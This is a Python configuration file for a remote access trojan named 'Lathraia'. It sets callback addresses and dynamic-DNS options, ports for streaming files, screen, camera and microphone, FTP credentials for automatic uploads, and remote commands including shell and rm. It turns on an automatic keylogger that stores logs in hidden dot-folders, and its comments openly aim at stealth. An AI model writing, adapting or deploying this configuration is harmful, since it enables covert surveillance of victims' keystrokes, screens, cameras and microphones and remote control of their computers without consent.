import os
import socket

# Standard, straightforward configuration

WELCOME_MSG = """
You have successfully connected to the Lathraia client, running version {version}.
Need help with the corelib functions (main functions)? Type the Python command help(functions.corelib).
"""

# What additional programs do you want working alongside us?
# Network configurations
# Any port above 1024 should be across both the client and the server, at least on GNU/Linux

PORT = 44444 # For Python
PROTOCOL_PORT = PORT + 1 # Unused
DATA_PORT = PORT + 2 # File transfers
VIDEO_PORT = PORT + 3 # Video (Desktop and Camera) transfers
AUDIO_PORT = PORT + 5 # Sound (Microphone, Desktop) transfers

# Your port forwarding range will be PORT - PORT+4
# Yes, we do not offer UpNP, so port forward manually. You shouldn't be using this program if you
# can't do that.

# What IP Address to connect to
# Additionally, one may use a dynamic DNS!
# If you want to use a domain, then use socket.gethostbyname(DNS) to resolve it to an IP address below
# Example
# ^
# |
# - - - - 
#       |
#       V
# IP_ADDRESS = socket.gethostbyname("mydomain.noip.net")

IP_ADDRESS = "127.0.0.1"

# FTP Server configuration
# For example, you may want to automatically upload something to an FTP server while you're not there.
FTP_SERVER_ADDRESS = "127.0.0.1"
FTP_USERNAME = "ftp username"
FTP_PASSWORD = "ftp password"
FTP_PORT = 21


# This is to distinguish different computers on the same network
# !!! You must set this to something different from the other stubs, or interference will occur !!!
# It can be the user, as shown here! But it can be anything.

CALLSIGN = os.getenv("USER")


# Show debug messages? Highly recommended that you keep this option on, lest something goes wrong!
SHOW_DEBUG = True

# Temporary directory
DOWNLOAD_TMP_DIR = "/tmp/"

# Choose the commands that the server shall interpret without function braces ()'s
quick_command = [
    "ls",
    "cd",
    "shell",
    "read",
    "write",
    "mv",
    "rm",
    "print"
]

# Dependencies for external programs!
# Pip will install these as it sees fit.
# Note, we install under pip and pip3 to ensure success.
# The program is designed to simply not run a given plugin if dependencies are not met. The whole server WILL not crash!

dependencies = [
    "mss", # Screenshare
    "Xlib", # Keylogger
    "pyxhook", # Keylogger
    "PyUserInput", # Remote keyboard and mouse
    "pygame", # Camera,
    "PyAudio" # Microphone
]

# Keylogger Configuration
# Preferably, use dot-files to obscure them even further.
# Change it to whatever you want. That's the great thing about a simple, albeit somewhat complex, program!

# If the folder does not exist, it will be created.
KEYLOGGER_FOLDER_LOCATION = "/home/{user}/.cache/.on/".format(
    user = os.getenv("USER")
)

KEYLOGGER_LOG_LOCATION = KEYLOGGER_FOLDER_LOCATION + ".{date}.json"
KEYLOGGER_DATE_FORMAT = ""
AUTO_KEYLOGGER = True

# Remote desktop

SCREEN_VIEW_FPS = 15 # It's not really fps, but I'd say to keep within the 1-25 range.
SCREEN_COMPRESSION_LEVEL = 8 # 0-9, based on zlib

# LAG will occur with high fpses
# You want to be stealthy, right?
# Lathraia = Stealth! Not really.

# Remote camera
REMOTE_CAMERA_DIM_X = 640
REMOTE_CAMERA_DIM_Y = 480

# Speech logger

# When we're online, use Google's API.
# Be careful! We don't know if Google is monitoring us.
# By default, we use the Sphinx algorithim, which sucks but works offline.

SPEECH_USE_GOOGLE_WHEN_ONLINE = True

# Advanced configuration
# Do not change this if you do not know what you are doing!
RECEIVING_CHUNK_SIZE = 1024
LOOP_SLEEP_TIME = 5 # in secs